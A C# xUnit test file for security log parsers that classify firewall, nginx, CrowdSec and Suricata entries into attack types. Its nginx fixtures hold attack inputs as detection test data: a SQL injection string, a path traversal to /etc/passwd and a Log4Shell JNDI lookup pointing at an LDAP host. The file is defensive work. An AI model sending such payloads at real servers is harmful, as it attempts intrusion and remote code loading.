using XrCopilotLab.Intrusion.Mcp.Core.Analysis;
using XrCopilotLab.Intrusion.Mcp.Core.Models;
using XrCopilotLab.Intrusion.Mcp.Core.Parsing;
using Xunit;

namespace XrCopilotLab.Intrusion.Mcp.Core.Tests;

public class UfwLogParserTests
{
    private static readonly TimeZoneInfo Rome = TimeZoneInfo.FindSystemTimeZoneById("Europe/Rome");
    private static readonly DateTimeOffset Now = new(2026, 11, 10, 12, 0, 0, TimeSpan.FromHours(1));

    [Fact]
    public void Reads_a_blocked_tcp_connection()
    {
        const string line = "2026-11-10T00:31:02.118204+01:00 bastion-01 kernel: [812345.123456] [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5a:01:02 SRC=198.51.100.213 DST=10.30.0.15 LEN=44 TOS=0x00 PREC=0x00 TTL=242 ID=54321 PROTO=TCP SPT=40112 DPT=502 WINDOW=1024 RES=0x00 SYN URGP=0";
        Assert.True(UfwLogParser.TryParse(line, Rome, Now, out var e));
        Assert.Equal((LogEventKind.FirewallBlock, "198.51.100.213", 502, "TCP"), (e!.Kind, e.SourceIp, e.TargetPort, e.Protocol));
    }

    [Fact]
    public void Reads_the_classic_format_and_udp()
    {
        const string line = "Nov 10 00:31:02 bastion-01 kernel: [812345.123456] [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.9 DST=10.30.0.15 LEN=44 PROTO=UDP SPT=5000 DPT=47808 LEN=24";
        Assert.True(UfwLogParser.TryParse(line, Rome, Now, out var e));
        Assert.Equal((47808, "UDP"), (e!.TargetPort, e.Protocol));
    }

    [Theory]
    [InlineData("2026-11-10T00:31:02+01:00 h kernel: [1.0] [UFW ALLOW] IN=eth0 OUT= SRC=203.0.113.9 DST=10.30.0.15 PROTO=TCP SPT=5000 DPT=22")]
    [InlineData("2026-11-10T00:31:02+01:00 h kernel: [1.0] [UFW AUDIT] IN=eth0 OUT= SRC=203.0.113.9 DST=10.30.0.15 PROTO=TCP SPT=5000 DPT=22")]
    [InlineData("2026-11-10T00:31:02+01:00 h sshd[1]: [UFW BLOCK] SRC=203.0.113.9 PROTO=TCP DPT=22")]
    public void Ignores_what_is_not_a_block_by_the_kernel(string line) =>
        Assert.False(UfwLogParser.TryParse(line, Rome, Now, out _));
}

public class NginxAccessLogParserTests
{
    [Theory]
    [InlineData("/.env", 404, "curl/8.5.0", "env-file", AttackType.WebVulnerabilityScan)]
    [InlineData("/wp-login.php", 404, "Mozilla/5.0", "wordpress", AttackType.WebVulnerabilityScan)]
    [InlineData("/index.php?id=1%27%20UNION%20SELECT%20a,b%20FROM%20users--", 400, "python-requests/2.31.0", "sql-injection", AttackType.WebExploitAttempt)]
    [InlineData("/static/..%2f..%2fetc/passwd", 400, "-", "path-traversal", AttackType.WebExploitAttempt)]
    [InlineData("/?x=%24%7Bjndi:ldap://198.51.100.250:1389/a%7D", 404, "-", "log4shell", AttackType.WebExploitAttempt)]
    [InlineData("/", 200, "Mozilla/5.0 zgrab/0.x", "scanner-agent", AttackType.WebVulnerabilityScan)]
    [InlineData("/admin/", 401, "Mozilla/5.0", "auth-failure", AttackType.WebLoginBruteForce)]
    [InlineData("/login", 429, "Mozilla/5.0", "rate-limited", AttackType.RequestFlood)]
    public void Keeps_the_requests_that_match_an_attack(string path, int status, string agent, string rule, AttackType type)
    {
        var line = $"203.0.113.7 - - [10/Nov/2026:03:12:45 +0100] \"GET {path} HTTP/1.1\" {status} 162 \"-\" \"{agent}\"";
        Assert.True(NginxAccessLogParser.TryParse(line, out var e));
        Assert.Equal((rule, status, "203.0.113.7"), (e!.Rule, e.Status, e.SourceIp));
        Assert.Equal(type, WebProbeRules.TypeOf(e.Rule!));
        Assert.Equal(new DateTimeOffset(2026, 11, 10, 3, 12, 45, TimeSpan.FromHours(1)), e.Time);
    }

    [Theory]
    [InlineData("198.51.100.9 - - [10/Nov/2026:09:00:00 +0100] \"GET /dashboard HTTP/1.1\" 200 5120 \"-\" \"Mozilla/5.0 (Windows NT 10.0)\"")]
    [InlineData("198.51.100.150 - - [10/Nov/2026:09:00:00 +0100] \"GET /robots.txt HTTP/1.1\" 200 51 \"-\" \"Mozilla/5.0 (compatible; Googlebot/2.1)\"")]
    [InlineData("not a log line")]
    public void Skips_ordinary_traffic(string line) =>
        Assert.False(NginxAccessLogParser.TryParse(line, out _));
}

public class CrowdsecLogParserTests
{
    [Fact]
    public void Reads_an_alert()
    {
        const string line = "time=\"2026-11-10T01:25:13+01:00\" level=info msg=\"Ip 198.51.100.213 performed 'crowdsecurity/ssh-slow-bf' (11 events over 31m2s) at 2026-11-10 00:25:13.48 +0000 UTC\"";
        Assert.True(CrowdsecLogParser.TryParse(line, out var e));
        Assert.Equal((LogEventKind.CrowdsecAlert, "198.51.100.213", "crowdsecurity/ssh-slow-bf", "11 events over 31m2s"), (e!.Kind, e.SourceIp, e.Rule, e.Detail));
        Assert.Equal(AttackType.SshBruteForce, AttackCatalog.FromScenario(e.Rule!));
    }

    [Fact]
    public void Reads_a_decision()
    {
        const string line = "time=\"2026-11-10T01:25:13+01:00\" level=info msg=\"(5ac0d2f1e8a94c4a/crowdsec) crowdsecurity/ssh-slow-bf by ip 198.51.100.213 (MD/64499) : 4h ban on Ip 198.51.100.213\"";
        Assert.True(CrowdsecLogParser.TryParse(line, out var e));
        Assert.Equal((LogEventKind.CrowdsecDecision, "4h ban"), (e!.Kind, e.Detail));
    }

    [Theory]
    [InlineData("crowdsecurity/iptables-scan-multi_ports", AttackType.PortScan)]
    [InlineData("crowdsecurity/http-sqli-probing", AttackType.WebExploitAttempt)]
    [InlineData("crowdsecurity/apache_log4j2_cve-2021-44228", AttackType.WebExploitAttempt)]
    [InlineData("crowdsecurity/http-probing", AttackType.WebVulnerabilityScan)]
    [InlineData("crowdsecurity/http-sensitive-files", AttackType.WebVulnerabilityScan)]
    [InlineData("crowdsecurity/http-generic-bf", AttackType.WebLoginBruteForce)]
    [InlineData("crowdsecurity/something-new", AttackType.Other)]
    public void Maps_scenarios_to_attack_types(string scenario, AttackType type) =>
        Assert.Equal(type, AttackCatalog.FromScenario(scenario));

    [Theory]
    [InlineData("time=\"2026-11-10T01:25:13+01:00\" level=info msg=\"Starting processing data\"")]
    [InlineData("time=\"2026-11-10T01:25:13+01:00\" level=warning msg=\"failed to fetch hub index\"")]
    public void Ignores_service_lines(string line) =>
        Assert.False(CrowdsecLogParser.TryParse(line, out _));
}

public class SuricataEveParserTests
{
    private static readonly IReadOnlySet<string> Host = new HashSet<string> { "10.30.0.15" };

    private const string Inbound = """{"timestamp":"2026-11-10T04:10:02.118204+0100","flow_id":1,"event_type":"alert","src_ip":"203.0.113.40","src_port":51544,"dest_ip":"10.30.0.15","dest_port":22,"proto":"TCP","app_proto":"ssh","alert":{"action":"allowed","gid":1,"signature_id":9000010,"rev":1,"signature":"ET EXPLOIT Possible OpenSSH regreSSHion Race Condition Attempt (CVE-2024-6387)","category":"Attempted Administrator Privilege Gain","severity":1}}""";
    private const string Outbound = """{"timestamp":"2026-11-10T03:12:40.000000+0100","event_type":"alert","src_ip":"10.30.0.15","src_port":40112,"dest_ip":"203.0.113.66","dest_port":80,"proto":"TCP","app_proto":"http","alert":{"signature_id":9000001,"signature":"ET MALWARE Linux Backdoor CnC Checkin","category":"A Network Trojan was detected","severity":1}}""";

    [Fact]
    public void Reads_an_alert_coming_in()
    {
        Assert.True(SuricataEveParser.TryParse(Inbound, Host, out var e));
        Assert.Equal((LogEventKind.IdsAlert, LogOrigin.Suricata, "203.0.113.40", 22, "ssh", 9000010, 1, false),
            (e!.Kind, e.Origin, e.SourceIp, e.TargetPort, e.Protocol, e.SignatureId, e.Priority, e.Outbound));
        Assert.Equal(new DateTimeOffset(2026, 11, 10, 4, 10, 2, 118, TimeSpan.FromHours(1)).AddTicks(2040), e.Time);
        Assert.Equal(AttackType.NetworkExploitAttempt, AttackCatalog.FromIdsAlert(e));
    }

    [Fact]
    public void A_connection_the_host_opened_is_about_the_other_side()
    {
        Assert.True(SuricataEveParser.TryParse(Outbound, Host, out var e));
        Assert.Equal(("203.0.113.66", true, 80), (e!.SourceIp, e.Outbound, e.TargetPort));
        Assert.Equal(AttackType.CommandAndControl, AttackCatalog.FromIdsAlert(e));
    }

    [Fact]
    public void Without_the_host_addresses_private_to_public_is_outbound()
    {
        Assert.True(SuricataEveParser.TryParse(Outbound, new HashSet<string>(), out var e));
        Assert.True(e!.Outbound);
    }

    [Theory]
    [InlineData("""{"timestamp":"2026-11-10T03:12:40.000000+0100","event_type":"flow","src_ip":"203.0.113.40","dest_ip":"10.30.0.15"}""")]
    [InlineData("""{"timestamp":"2026-11-10T03:12:40.000000+0100","event_type":"alert","src_ip":"203.0.113.40","dest_ip":"10.30.0.15","alert":{"signature":"SURICATA STREAM Packet with invalid ack","category":"Generic Protocol Command Decode","severity":3}}""")]
    [InlineData("""{"event_type":"alert", broken""")]
    public void Skips_other_events_low_priority_alerts_and_broken_lines(string line) =>
        Assert.False(SuricataEveParser.TryParse(line, Host, out _));

    [Theory]
    [InlineData("ET CINS Active Threat Intelligence Poor Reputation IP group 42", "Misc Attack", null, false, AttackType.KnownMaliciousSource)]
    [InlineData("ET DROP Dshield Block Listed Source group 1", "Misc Attack", null, false, AttackType.KnownMaliciousSource)]
    [InlineData("ET SCAN Suspicious inbound to mySQL port 3306", "Potentially Bad Traffic", null, false, AttackType.PortScan)]
    [InlineData("ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT", "Web Application Attack", "http", false, AttackType.WebExploitAttempt)]
    [InlineData("ET SCADA Modbus Write Multiple Registers", "Attempted Information Leak", "modbus", false, AttackType.IndustrialProtocolCommand)]
    [InlineData("ET MALWARE Linux Backdoor CnC Checkin", "A Network Trojan was detected", "http", false, AttackType.NetworkExploitAttempt)]
    [InlineData("ET MALWARE Linux Backdoor CnC Checkin", "A Network Trojan was detected", "http", true, AttackType.CommandAndControl)]
    [InlineData("ET EXPLOIT Apache log4j RCE Attempt (http ldap) (CVE-2021-44228)", "Attempted Administrator Privilege Gain", "http", false, AttackType.WebExploitAttempt)]
    [InlineData("ET EXPLOIT Possible OpenSSH regreSSHion Race Condition Attempt (CVE-2024-6387)", "Attempted Administrator Privilege Gain", "ssh", false, AttackType.NetworkExploitAttempt)]
    [InlineData("ET INFO Observed DNS Query to .xyz TLD", "Potentially Bad Traffic", "dns", false, AttackType.Other)]
    public void Maps_signatures_to_attack_types(string signature, string category, string? protocol, bool outbound, AttackType type) =>
        Assert.Equal(type, AttackCatalog.FromIdsAlert(new LogEvent(DateTimeOffset.UnixEpoch, LogEventKind.IdsAlert, LogOrigin.Suricata, "203.0.113.1",
            Protocol: protocol, Rule: signature, Detail: category, Priority: 2, Outbound: outbound)));
}
